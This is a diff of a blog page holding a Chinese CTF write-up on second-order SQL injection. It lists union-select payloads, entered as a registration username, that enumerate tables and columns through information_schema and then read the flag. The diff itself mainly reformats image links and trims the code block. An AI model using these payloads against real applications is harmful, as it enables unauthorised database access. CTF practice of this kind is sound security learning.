@@ -222,15 +222,15 @@
 
         <div class="post-content">
             <h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>二次注入（个人理解二次注入不是立马生效，而是在另一个界面时被调用，SQL语句在那个界面被调用生效）</p>
-<p>![2](..&#x2F;images&#x2F;October 2019 Twice SQL Injection&#x2F;2.png)</p>
+<p><img src="/../images/October2019TwiceSQLInjection/2.png" alt="2"></p>
 <p>进行注册；</p>
-<p>![3](..&#x2F;images&#x2F;October 2019 Twice SQL Injection&#x2F;3.png)</p>
+<p><img src="/../images/October2019TwiceSQLInjection/3.png" alt="3"></p>
 <p>（ps：跟我做的登陆页面好像）</p>
 <p>注入点就在这里username，没有任何过滤，但是很难想到，因为进去后有一个修改信息的东西过滤了‘和“，我直接在那里面搞好久，发现不能用宽字节绕过，（然后就不知道怎么办 了）所以就看了wp，发现就是这里有注入点。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username =1&#x27; union select database() #</span><br><span class="line">username =1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27; #</span><br><span class="line"></span><br><span class="line">username =1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br><span class="line"></span><br><span class="line">username =1&#x27; union select flag from flag #</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">username =1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br><span class="line"></span><br><span class="line">username =1&#x27; union select flag from flag #</span><br></pre></td></tr></table></figure>
 
 <p>常规操作，但是没找到注入点，有点可惜。</p>
-<p>![1](..&#x2F;images&#x2F;October 2019 Twice SQL Injection&#x2F;1.png)</p>
+<p><img src="/../images/October2019TwiceSQLInjection/1.png" alt="1"></p>
 
         </div>
 
